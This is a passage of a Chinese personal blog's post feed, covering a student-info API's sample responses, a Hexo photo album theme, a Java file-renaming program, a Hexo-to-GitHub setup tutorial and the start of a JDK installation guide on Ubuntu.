&#125;<br>    ],<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">200</span>,<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;操作成功&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>失败</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-literal">null</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">500</span>,<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;秘钥错误&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="专用接口"><a href="#专用接口" class="headerlink" title="专用接口"></a>专用接口</h3><p>专用接口仅面向学校可信组织开放，开发者可以凭借学号、姓名、专业、班级这四个信息之一获取与之相关信息。</p><p>1.专用接口调用链接为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">url?<span class="hljs-attr">token</span><span class="hljs-operator">=</span>专用秘钥<span class="hljs-variable">&amp;keytype</span>=索引类型<span class="hljs-variable">&amp;keyword</span>=索引数据<br></code></pre></td></tr></table></figure><p>其中url与专用秘钥请联系<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#99;&#116;&#102;&#x74;&#x6f;&#x6f;&#108;&#115;&#46;&#99;&#111;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#99;&#116;&#102;&#x74;&#x6f;&#x6f;&#108;&#115;&#46;&#99;&#111;&#x6d;</a>申请资格，索引类型分为四类，分别是bj(班级)、zy(专业)、uid(学号)、unme(姓名)，索引数据为索引类型对应的数据，例如以下示例：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">url?<span class="hljs-attr">token</span><span class="hljs-operator">=</span>xxxx<span class="hljs-variable">&amp;keytype</span>=bj<span class="hljs-variable">&amp;keyword</span>=物联网<span class="hljs-number">1601</span><br><br>url?<span class="hljs-attr">token</span><span class="hljs-operator">=</span>xxxx<span class="hljs-variable">&amp;keytype</span>=uid<span class="hljs-variable">&amp;keyword</span>=<span class="hljs-number">16853046</span><br></code></pre></td></tr></table></figure><p>2.返回数据样式：</p><ul><li>单个</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-comment">//用户在本平台的唯一身份码</span><br>            <span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-number">16853046</span>,<span class="hljs-comment">//用户学号</span><br>            <span class="hljs-string">&quot;uname&quot;</span>:<span class="hljs-string">&quot;王启航&quot;</span>,<span class="hljs-comment">//用户姓名</span><br>            <span class="hljs-string">&quot;grade&quot;</span>:<span class="hljs-string">&quot;16&quot;</span>,<span class="hljs-comment">//用户年级</span><br>            <span class="hljs-string">&quot;college&quot;</span>:<span class="hljs-string">&quot;计算机与信息技术学院&quot;</span>,<span class="hljs-comment">//用户所在学院</span><br>            <span class="hljs-string">&quot;speciality&quot;</span>:<span class="hljs-string">&quot;物联网&quot;</span>,<span class="hljs-comment">//用户所在专业</span><br>            <span class="hljs-string">&quot;clazz&quot;</span>:<span class="hljs-string">&quot;物联网1601&quot;</span><span class="hljs-comment">//班级</span><br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">200</span>,<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;操作成功&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>多个</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-comment">//用户在本平台的唯一身份码</span><br>            <span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-number">16853046</span>,<span class="hljs-comment">//用户学号</span><br>            <span class="hljs-string">&quot;uname&quot;</span>:<span class="hljs-string">&quot;王启航&quot;</span>,<span class="hljs-comment">//用户姓名</span><br>            <span class="hljs-string">&quot;grade&quot;</span>:<span class="hljs-string">&quot;16&quot;</span>,<span class="hljs-comment">//用户年级</span><br>            <span class="hljs-string">&quot;college&quot;</span>:<span class="hljs-string">&quot;计算机与信息技术学院&quot;</span>,<span class="hljs-comment">//用户所在学院</span><br>            <span class="hljs-string">&quot;speciality&quot;</span>:<span class="hljs-string">&quot;物联网&quot;</span>,<span class="hljs-comment">//用户所在专业</span><br>            <span class="hljs-string">&quot;clazz&quot;</span>:<span class="hljs-string">&quot;物联网1601&quot;</span><span class="hljs-comment">//班级</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-comment">//用户在本平台的唯一身份码</span><br>            <span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-number">16853046</span>,<span class="hljs-comment">//用户学号</span><br>            <span class="hljs-string">&quot;uname&quot;</span>:<span class="hljs-string">&quot;王启航&quot;</span>,<span class="hljs-comment">//用户姓名</span><br>            <span class="hljs-string">&quot;grade&quot;</span>:<span class="hljs-string">&quot;16&quot;</span>,<span class="hljs-comment">//用户年级</span><br>            <span class="hljs-string">&quot;college&quot;</span>:<span class="hljs-string">&quot;计算机与信息技术学院&quot;</span>,<span class="hljs-comment">//用户所在学院</span><br>            <span class="hljs-string">&quot;speciality&quot;</span>:<span class="hljs-string">&quot;物联网&quot;</span>,<span class="hljs-comment">//用户所在专业</span><br>            <span class="hljs-string">&quot;clazz&quot;</span>:<span class="hljs-string">&quot;物联网1601&quot;</span><span class="hljs-comment">//班级</span><br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">200</span>,<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;操作成功&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>问题与建议都可以联系：<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#64;&#99;&#x74;&#x66;&#116;&#111;&#x6f;&#x6c;&#x73;&#46;&#99;&#111;&#109;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#64;&#99;&#x74;&#x66;&#116;&#111;&#x6f;&#x6c;&#x73;&#46;&#99;&#111;&#109;</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>文档</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo-yilia主题相册</title>
    <link href="/2017/12/post235/"/>
    <url>/2017/12/post235/</url>
    
    <content type="html"><![CDATA[<h3 id="起由"><a href="#起由" class="headerlink" title="起由"></a>起由</h3><p>从yilia作者<a href="http://litten.me/">Litten的博客</a>看到了他的相册，蛮喜欢的，就想给自己也弄一个，于是找了到他的博客在github上边的备份下载了source/photos文件夹，但是没有get到作者的方法，只好稍作修改把照片放到本地实现了作者博客中的效果。</p><span id="more"></span><h3 id="改动"><a href="#改动" class="headerlink" title="改动"></a>改动</h3><p>1.由原作者图片托管在instagram改为托管在本地</p><p>2.由原作者图片尺寸固定改为尺寸可以写入ins.json</p><p>3.去掉原作者type选项，只可以放图片而不能放视频，并且图片格式只支持jpg（如果需要支持更多格式对ins.js稍作修改即可）</p><p>4.link作为图片名</p><p>5.去掉ins.jsn中的src选项</p><h3 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h3><p>点击左边的相册，或者<a href="/photos">点此链接</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>请移步github下载：<a href="https://github.com/dr34m-cn/yilia-photos">https://github.com/dr34m-cn/yilia-photos</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>略缩图可下载这个软件批量生成</p><p>链接: <a href="https://pan.baidu.com/s/1slULnUd">https://pan.baidu.com/s/1slULnUd</a> 密码: 54je</p><p>推荐略缩图尺寸328x328</p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java实现文件重命名，Java文件追加写入，java读取图片尺寸</title>
    <link href="/2017/12/post234/"/>
    <url>/2017/12/post234/</url>
    
    <content type="html"><![CDATA[<h3 id="起由"><a href="#起由" class="headerlink" title="起由"></a>起由</h3><p>因为规范要求，需要对一批文件重命名并获取尺寸，刚好上午的java课学了文件输入输出流，学以致用嘛，就利用java做了尝试。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>1.文件按照指定格式重命名；</p><p>2.文件夹内所有文件名与图片尺寸按格式写入一个TXT文件。</p><span id="more"></span><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>之前：</p><img src="/2017/12/post234/234-1.jpg" class="" title="234-1"><p>之后：</p><img src="/2017/12/post234/234-2.jpg" class="" title="234-2"><img src="/2017/12/post234/234-3.jpg" class="" title="234-3"><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.awt.image.BufferedImage;<br><span class="hljs-keyword">import</span> javax.imageio.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileNameChange</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/filenamechangejava/&quot;</span>;<br><span class="hljs-type">File</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir+<span class="hljs-string">&quot;photo&quot;</span>);<br>File[] s = f1.listFiles();<span class="hljs-comment">//为目录下所有文件构造对象到文件数组s中</span><br>String[] k = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">100</span>];<span class="hljs-comment">//定义一个字符串数组来存储文件名</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i &lt; s.length;i++)&#123;<br>k[i] = s[i].getName();<br>&#125;<span class="hljs-comment">//存储所有文件名到k数组中</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i &lt; s.length;i++)&#123;<br>k[i] = k[i].substring(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>)+k[i].substring(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)+k[i].substring(<span class="hljs-number">8</span>,<span class="hljs-number">10</span>)+k[i].substring(<span class="hljs-number">11</span>,<span class="hljs-number">15</span>)+<span class="hljs-string">&quot;.jpg&quot;</span>;<span class="hljs-comment">//更改文件名为想要的效果</span><br>s[i].renameTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir+<span class="hljs-string">&quot;photo/&quot;</span>+k[i]));<span class="hljs-comment">//重命名文件</span><br>&#125;<br>System.out.println(<span class="hljs-string">&quot;Rename complete!&quot;</span>);<br><span class="hljs-comment">//以上为重命名部分，以下为写文件部分</span><br>File[] s2 = f1.listFiles();<br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;j &lt; s.length;j++)&#123;<br>k[j] = <span class="hljs-string">&quot;\&quot;&quot;</span>+k[j].substring(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>)+<span class="hljs-string">&quot;\&quot;,\n&quot;</span>;<br><span class="hljs-type">BufferedImage</span> <span class="hljs-variable">pic</span> <span class="hljs-operator">=</span> ImageIO.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(s2[j]));<span class="hljs-comment">//读取图片</span><br><span class="hljs-type">String</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> k[j] + <span class="hljs-string">&quot;\&quot;&quot;</span> + pic.getWidth()+ <span class="hljs-string">&quot;x&quot;</span> + pic.getHeight()+<span class="hljs-string">&quot;\&quot;,\n\n&quot;</span>;<span class="hljs-comment">//获取图片宽和高并和文件名一同存储到字符串m</span><br><span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(dir+<span class="hljs-string">&quot;name.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<span class="hljs-comment">//用读写方式打开文件</span><br><span class="hljs-type">long</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> fos.length();<span class="hljs-comment">//返回文件长度到len</span><br>fos.seek(len);<span class="hljs-comment">//定义指针从len开始写入</span><br>fos.writeBytes(m);<span class="hljs-comment">//写入文件</span><br>fos.close();<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(IOException e)&#123;<br>e.printStackTrace();<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;Write name and size in \&quot;&quot;</span>+dir+<span class="hljs-string">&quot;name.txt\&quot; complete!&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo安装配置并托管至github</title>
    <link href="/2017/12/post233/"/>
    <url>/2017/12/post233/</url>
    
    <content type="html"><![CDATA[<p>所有可能用到的工具或者文件都放在百度网盘：链接：<a href="https://pan.baidu.com/s/1mhLRnk8">https://pan.baidu.com/s/1mhLRnk8</a> 提取密码：7ott</p><h3 id="一、安装Hexo到本地"><a href="#一、安装Hexo到本地" class="headerlink" title="一、安装Hexo到本地"></a>一、安装Hexo到本地</h3><h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h4><p>1.1从<a href="https://git-scm.com/download/win">官网</a>或者上边提供的百度网盘下载Git安装包，由于众所周知的原因，官网下载十分缓慢。下载完安装即可，中间会让你选择默认编辑器，如果不习惯Vim推荐Notepad++作为默认编辑器，如图</p><span id="more"></span><img src="/2017/12/post233/233-1.jpg" class="" title="233-1"><p>其他保持默认即可。</p><h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p>2.1从<a href="https://nodejs.org/zh-cn/">官网</a>或者上边提供的百度网盘下载Node.js安装包。下载完安装即可，如果没有特别需求安装选项全部保持默认。</p><h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>3.1使用Win+R打开运行，输入<code>cmd</code>，打开命令提示符，然后输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>大概几十秒到2分钟后即可安装完成</p><p>3.2安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。下边以放在D盘的hexo文件夹下为例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo init D:\hexo<br>D:<br><span class="hljs-built_in">cd</span> hexo &amp;&amp; npm install<br></code></pre></td></tr></table></figure><p>大概几十秒到2分钟后即可安装完成，此时D:\hexo文件夹的目录树如下</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br><span class="hljs-string">|   ├── _drafts</span><br><span class="hljs-string">|   └── _posts</span><br>└── themes<br></code></pre></td></tr></table></figure><h4 id="4-配置hexo"><a href="#4-配置hexo" class="headerlink" title="4.配置hexo"></a>4.配置hexo</h4><p>4.1用Notepad++或者其他编辑器打开_config.yml文件</p><p>多数设置保持默认即可，一般需要改动的有如下几项：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">title: <span class="hljs-comment">#网站名称</span><br>subtitle: <span class="hljs-comment">#副标题</span><br>description: <span class="hljs-comment">#网站描述，主要用于SEO</span><br>author: <span class="hljs-comment">#作者</span><br>language: <span class="hljs-comment">#语言，中文填写&#x27;zh-cn&#x27;，没有引号</span><br>timezone: <span class="hljs-comment">#网站时区。Hexo 默认使用您电脑的时区。中国可以填写&#x27;Asia/Shanghai&#x27;，没有引号</span><br>url: <span class="hljs-comment">#你的网址，可以先不改动</span><br>theme: <span class="hljs-comment">#主题选择</span><br></code></pre></td></tr></table></figure><p>详细配置可以参照<a href="https://hexo.io/zh-cn/docs/configuration.html">Hexo官方文档</a></p><p>4.2你可以到网络上下载主题，比如<a href="https://hexo.io/themes/">官网主题</a>，下载完解压到<code>~\hexo\themes</code>目录下的一个文件夹里，然后在<code>_config.yml</code>里边的<code>theme: </code>后填写文件夹名即可应用主题</p><h4 id="5-新建博文"><a href="#5-新建博文" class="headerlink" title="5.新建博文"></a>5.新建博文</h4><p>5.1首先在cmd切换到你的hexo目录，可以在资源管理器打开hexo所在目录，然后在地址栏输入<code>cmd</code>然后敲击回车，很方便</p><p>5.2cmd里边输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo new post001<br></code></pre></td></tr></table></figure><p>就能在<code>~hexo\source\_posts</code>目录下生成post001.md文件，文件名可以自定义，编辑该文件写博文，语法可以参照<a href="http://www.jianshu.com/p/q81RER">Markdown新手指南</a>，或者<a href="https://other-1252906577.costj.myqcloud.com/doc/post233.md">下载当前博文的.md文件</a>以作参考</p><h4 id="6-生成静态文件并预览"><a href="#6-生成静态文件并预览" class="headerlink" title="6.生成静态文件并预览"></a>6.生成静态文件并预览</h4><p>配置好hexo和主题并编辑完文章之后，可以通过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo g<br></code></pre></td></tr></table></figure><p>生成静态文件到public文件夹，你可以复制该文件夹下所有文件到你的网站目录来发布你的博客到网络</p><p>可以通过以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo s<br></code></pre></td></tr></table></figure><p>默认情况下在浏览器访问<code>http://localhost:4000/</code>预览你的博客</p><h3 id="二、托管hexo博客到github"><a href="#二、托管hexo博客到github" class="headerlink" title="二、托管hexo博客到github"></a>二、托管hexo博客到github</h3><h4 id="1-注册github账号并创建Repository"><a href="#1-注册github账号并创建Repository" class="headerlink" title="1.注册github账号并创建Repository"></a>1.注册github账号并创建Repository</h4><p>1.1注册账号就不多说了，登陆之后点击<code>new repository</code>，如图</p><img src="/2017/12/post233/233-2.jpg" class="" title="233-2"><p>然后编辑名称为xxx.github.io，xxx为你的用户名，可以添加一些描述，如图</p><img src="/2017/12/post233/233-3.jpg" class="" title="233-3"><p>完成之后点击<code>Create repository</code></p><h4 id="2-本地与github建立安全联系"><a href="#2-本地与github建立安全联系" class="headerlink" title="2.本地与github建立安全联系"></a>2.本地与github建立安全联系</h4><p>2.1生成ssh key</p><p>2.1.1如图，打开Git Bash</p><img src="/2017/12/post233/233-4.jpg" class="" title="233-4"><p>2.1.2创建.ssh文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> ~/.ssh<br></code></pre></td></tr></table></figure><p>2.1.3配置全局的name和email，把下边命令里边的<code>xxxx</code>换成你github的用户名，<code>xxxx@xxx.com</code>换成你github的注册邮箱</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">git config --global user.name <span class="hljs-string">&quot;xxxx&quot;</span>  <br>git config --global user.email <span class="hljs-string">&quot;xxxx@xxx.com&quot;</span><br></code></pre></td></tr></table></figure><p>2.1.4生成key</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh-keygen -t rsa -C <span class="hljs-string">&quot;xxxx@xxx.com&quot;</span><br></code></pre></td></tr></table></figure><p>输完命令后敲击三次回车，设置的密码为空，生成key成功</p><p>2.1.5打开<code>C:\用户\你的用户名</code>目录进入.ssh文件夹，用Notepad++或者其他编辑器打开id_rsa.pub，复制里面的内容添加到你github或者bitbucket ssh设置里即可，如下图</p><img src="/2017/12/post233/233-5.jpg" class="" title="233-5"><img src="/2017/12/post233/233-6.jpg" class="" title="233-6"><p>标题随意填写</p><h4 id="3-部署博客到github"><a href="#3-部署博客到github" class="headerlink" title="3.部署博客到github"></a>3.部署博客到github</h4><p>3.1为 Hexo 安装 Git 插件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>3.2修改你的 _config.yml 配置文件如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/deployment.html</span><br>deploy:<br>  <span class="hljs-built_in">type</span>:git<br>  repo: git@github.com:xxxx/xxxx.github.io.git<br>  branch: master<br></code></pre></td></tr></table></figure><p>注意修改其中的repo为你自己github的ssh地址</p><p>3.3在cmd切换到hexo目录下输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo clean &amp;&amp; hexo g -d<br></code></pre></td></tr></table></figure><p>即可完成部署，然后访问xxx.github.io就能访问你的博客了</p><p>3.4如果想使用自己的域名，只需要把域名CNAME解析到xxx.github.io，然后在<code>~\hexo\source</code>目录中创建文件<code>CNAME</code>（没有后缀名）,文件里填上你的自定义域名（没有<code>http://</code>或者<code>https://</code>）然后执行一遍</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo clean &amp;&amp; hexo g -d<br></code></pre></td></tr></table></figure><p>即可，以后发布新文章或者有其他改动，都可以用上边的命令完成更新，或者用下边的命令在本地预览，前提是cmd切换到了hexo目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s<br></code></pre></td></tr></table></figure><p>本文参考资料：<a href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a>，<a href="https://www.cnblogs.com/imapla/p/5533000.html">Hexo博客部署到github</a>，<a href="http://blog.csdn.net/lsyz0021/article/details/52064829">win 7下git ssh创建key</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新起点，新征程</title>
    <link href="/2017/12/post232/"/>
    <url>/2017/12/post232/</url>
    
    <content type="html"><![CDATA[<h2 id="新起点，新征程"><a href="#新起点，新征程" class="headerlink" title="新起点，新征程"></a>新起点，新征程</h2><p>之前一直再用wordpress写博客，但是wordpress有很多缺点，比如说不够安全，评论方面太多广告，占用服务器资源，等等。后来发现一个<a href="http://www.se7ensec.cn/">朋友的博客</a>换成了hexo，百度了一下，纯静态博客，还能托管到github，不需要自己的公网服务器资源，于是当晚就开始接触配置，托管之后发现不能配置https，对于有点强迫症的我来说难以忍受，再加上托管服务器在日本，就又配合腾讯云的cdn加速服务实现了https。详细的过程有空会写个博客记录下来。</p><span id="more"></span><img src="/2017/12/post232/new.jpg" class="" title="new"><p>总结一下hexo的优缺点：</p><p>优点：安全，节约资源，配置简单高效，静态网站对搜索引擎更友好</p><p>缺点：只能在特定电脑上配置，如果没有及时备份本地数据，一旦本地文件丢失，后果不堪设想</p><p>其实这些缺点对于不经常更新的个人博客来说无关紧要，所以最终舍弃了wordpress而投入了hexo的怀抱。</p><p>我的博客一直很少更新，但从没打算放弃。写的博文少，看的人更少。不过每当想到会有人从看我的博客中受益，就很满足了。</p><p>新起点，新征程，愿所有真诚都不会被辜负。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在ubuntu安装jdk并配置环境变量</title>
    <link href="/2017/09/post231/"/>
    <url>/2017/09/post231/</url>
    
    <content type="html"><![CDATA[<p>首先到java官网下载jdk:<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p><p>我使用的是ubuntu64位系统，所以下载的是jdk-8u144-linux-x64.tar.gz这个文件，下载完解压到/usr/lib/jvm目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> tar zxvf jdk-8u144-linux-x64.tar.gz -C /usr/lib/jvm<br></code></pre></td></tr></table></figure><p>(如果没有/usr/lib/jvm目录先使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> jvm<br></code></pre></td></tr></table></figure><p>这两条命令创建)</p><span id="more"></span><p>然后打开终端，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gedit ~/.bashrc<br></code></pre></td></tr></table></figure><p>在文本末尾加上</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/lib/jvm/jdk1.8.0_144<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">JRE_HOME</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">CLASSPATH</span>=.:$&#123;JAVA_HOME&#125;/lib:<span class="hljs-variable">$&#123;JRE_HOME&#125;</span>/lib<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:$PATH<br></code></pre></td></tr></table></figure><p>然后保存关闭编辑器，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 